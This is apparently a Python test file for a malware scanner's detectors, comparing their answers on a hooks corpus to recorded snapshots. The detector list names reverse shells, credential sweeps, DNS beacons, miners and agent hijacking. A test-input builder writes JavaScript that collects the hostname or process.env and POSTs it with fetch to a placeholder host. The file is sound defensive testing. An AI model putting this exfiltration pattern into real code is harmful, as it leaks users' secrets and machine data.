"""The engine's signs, one by one, on the hooks corpus (hooks_corpus.py),
held to their recorded outputs (_snapshots.py): signs_view gives each
detector's answer for a case — received code, download-and-run,
decode-and-run, PowerShell, stagers, reverse shells, the data flow, the
self-read, persistence, workflow secrets, piped and substituted downloads,
off-screen code, the exfiltration shapes, services, DNS beacons, dead
drops, the text read as a shell program, agent hijacking, the import code,
wallet swaps and the string-array line — so a difference names the
detector. And the data flow on texts longer than _LD_LONG (bundles).
"""
import unittest

from lazaret.scanner import _native
from tests.architecture import _snapshots
from tests.architecture.hooks_corpus import corpus

# what signs_view answers, in order
FIELDS = ("received_code_kind", "downloads_and_runs", "decodes_and_runs", "powershell_risk", "stager_at",
          "reverse_shell_at", "local_data_sent_at", "runs_own_source_at", "reads_own_source", "persistence_reasons",
          "dumps_workflow_secrets", "pipes_download_to_shell", "runs_substituted_download",
          "offscreen_code js", "offscreen_code py",
          "secret_endpoint_at", "credential_sweep_at", "exec_command_reasons", "dns_beacon_at", "miner_at",
          "raw_ip_connect", "capture_service", "exfil_signs", "service_reasons",
          "dns_beacon_at without host", "dead_drop_at",
          "_sh_reasons", "_shell_text", "_code_text",
          "agent_hijack", "agent_hijack_in_command", "_hook_is_suspicious", "_import_code js", "_import_code py",
          "wallet_swap_at", "string_array_line")


def long_texts():
    """Texts longer than _LD_LONG (a bundle): a name carries the data only
    _LD_NEAR characters from where it was given it."""
    filler = "".join("function f%d(a) { return a + %d; }\n" % (k, k) for k in range(8000))
    send = "fetch('https://x.invalid/', {method: 'POST', body: JSON.stringify(%s)});\n"
    payload = "const os = require('os');\nconst data = {h: os.hostname()};\n" + send % "data"
    return [filler + payload, payload + filler, "var data = {h: require('os').hostname()};\n" + filler + send % "data",
            "var data = process.env;\n" + filler[:30000] + "var data = 1;\n" + send % "data" + filler,
            "class C { constructor() { this.env = process.env; } }\n" + filler + "this.env.x;\n" + send % "this.env",
            "var require_x = __commonJS({ \"x.js\"(exports) { var e = process.env; } });\n" + filler
            + "var x = require_x();\n" + send % "x"]


def snapshot_sets():
    return {"signs": lambda: [("signs_view", {}, text) for text in corpus()],
            "long_texts": lambda: [("local_data_sent_at", {}, text) for text in long_texts()]}


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class SignsSnapshotTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.answers = _snapshots.run(snapshot_sets()["signs"]())

    def test_the_outputs_are_the_recorded_ones(self):
        self.assertFalse([a for a in self.answers if "ok" not in a][:5])
        _snapshots.check(self, "signs", self.answers)

    def test_every_field_is_reached(self):
        """The corpus holds cases where each sign is found (not only its absence)."""
        quiet = (None, [], -1, False)
        views = [a["ok"] for a in self.answers if "ok" in a]
        for k, field in enumerate(FIELDS):
            with self.subTest(field=field):
                self.assertTrue(any(v[k] not in quiet for v in views), field)


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class LongTextFlowSnapshotTests(unittest.TestCase):
    def test_the_outputs_are_the_recorded_ones(self):
        answers = _snapshots.run(snapshot_sets()["long_texts"]())
        self.assertEqual([a.get("ok") is not None for a in answers], [True, True, False, False, False, False])
        _snapshots.check(self, "long_texts", answers)


if __name__ == "__main__":
    unittest.main()
